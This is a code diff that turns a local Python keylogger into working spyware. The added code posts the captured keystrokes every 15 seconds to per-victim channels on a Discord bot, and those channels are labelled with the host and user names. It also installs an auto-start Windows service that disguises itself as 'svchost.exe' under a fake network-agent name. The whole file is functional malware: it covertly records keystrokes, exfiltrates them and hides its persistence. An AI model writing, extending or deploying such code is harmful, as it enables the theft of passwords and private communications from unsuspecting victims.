@@ -1,37 +1,86 @@
+import os
+import socket
 import threading
-from threading import Lock
-
+import uuid
+import ctypes
+import discord
 import pyWinhook
 import pythoncom
+from discord.ext import commands
+from discord.ext.tasks import loop
+import platform
+from shutil import copyfile
 
+# Globals
 log_buffer = r""
-mutex = Lock()
+bot = commands.Bot(command_prefix='$')
+client_id = uuid.uuid5(uuid.uuid4(), "keylogger")  # UUID to identify this instance
+channel = None
 
 # Constants
 BUFFER_FLUSH_PERIOD = 15.0  # Seconds
 
 
-def flush_buffer():
+@bot.event
+async def on_ready():
+    """
+    This function will run when the client first starts up. It's responsible for creating categories and channels if they
+    don't already exist
+    :return: None
+    """
+    await bot.wait_until_ready()
+
+    for guild in bot.guilds:
+        # Create keyloggers category if it doesn't exist
+        if discord.utils.get(guild.categories, name='Keyloggers') is None:
+            await guild.create_category('Keyloggers')
+        category = discord.utils.get(guild.categories, name='Keyloggers')
+
+        # Create channel for this client if it doesn't exist
+        if discord.utils.get(guild.text_channels, name=str(client_id)) is None:
+            # Get some variables for the channel topic
+            hostname = socket.getfqdn()
+            current_user = os.getlogin()
+
+            # Set permissions for channel (read-only)
+            overwrites = {
+                guild.default_role: discord.PermissionOverwrite(send_messages=False),
+                guild.me: discord.PermissionOverwrite(send_messages=True)
+            }
+
+            await guild.create_text_channel(name=str(client_id), category=category, topic="Hostname: {0} || User at install: {1}".format(hostname, current_user), overwrites=overwrites)
+
+        # Update outer scope with newly added channel
+        global channel
+        channel = discord.utils.get(guild.text_channels, name=str(client_id))
+
+        # Start flush buffer background task
+        flush_buffer.start()
+
+
+@loop(seconds=BUFFER_FLUSH_PERIOD)
+async def flush_buffer():
     """
     Flushes the keyboard input log buffer every BUFFER_FLUSH_PERIOD seconds
     :return: None
     """
-    threading.Timer(BUFFER_FLUSH_PERIOD, flush_buffer).start()
+    global log_buffer
 
-    mutex.acquire()
-    try:
-        global log_buffer
-
-        # Print the buffer contents
-        # TODO make this post to discord or something
-        print("=========================")
-        print(log_buffer)
-        print("=========================")
+    # If there's actually anything in the buffer, send it
+    if log_buffer != "":
+        await channel.send("```\n{0}\n```".format(log_buffer))
 
         # Empty the buffer
         log_buffer = r""
-    finally:
-        mutex.release()
+
+
+@flush_buffer.before_loop
+async def before_flush_buffer():
+    """
+    Wait until the bot is ready
+    :return:
+    """
+    await bot.wait_until_ready()
 
 
 def on_keyboard_event(event):
@@ -45,7 +94,7 @@ def on_keyboard_event(event):
 
     # Enter key
     if event_key == "Return":
-        log_buffer += "\n"
+        log_buffer += "\n[ENTER]\n"
 
     # Spacebar
     elif event_key == "Space":
@@ -66,13 +115,38 @@ def on_keyboard_event(event):
     return True
 
 
-# Setup the keyboard hooks
-hooks_manager = pyWinhook.HookManager()
-hooks_manager.KeyDown = on_keyboard_event
-hooks_manager.HookKeyboard()
+def poll_input():
+    """
+    Setup the keyboard polling to run in a background thread
+    :return:
+    """
+    # Setup the keyboard hooks
+    hooks_manager = pyWinhook.HookManager()
+    hooks_manager.KeyDown = on_keyboard_event
+    hooks_manager.HookKeyboard()
 
-# Flush the log buffer every 15 seconds
-flush_buffer()
+    # Continually poll for keyboard input
+    pythoncom.PumpMessages()
 
-# Continually poll for keyboard input
-pythoncom.PumpMessages()
+
+def create_persistence():
+    """
+    Establishes a persistence mechanism for this program to automatically restart itself
+    :return:
+    """
+    # Check if running as admin. If so, create system service
+    executable_path = os.path.abspath(os.path.dirname(__file__))
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        # This assumes that this binary is named 'svchost.exe'
+        os.system(r"""sc create IEEE802.11xAgent start=auto binpath={0}\svchost.exe obj=LocalSystem displayname="IEEE 802.11x AutoConfig Agent" """.format(executable_path))
+
+
+# Establish persistence
+create_persistence()
+
+# Setup keyboard polling thread
+poll_thread = threading.Thread(target=poll_input, args=())
+poll_thread.start()
+
+# Setup Discord client
+bot.run('[REDACTED]')
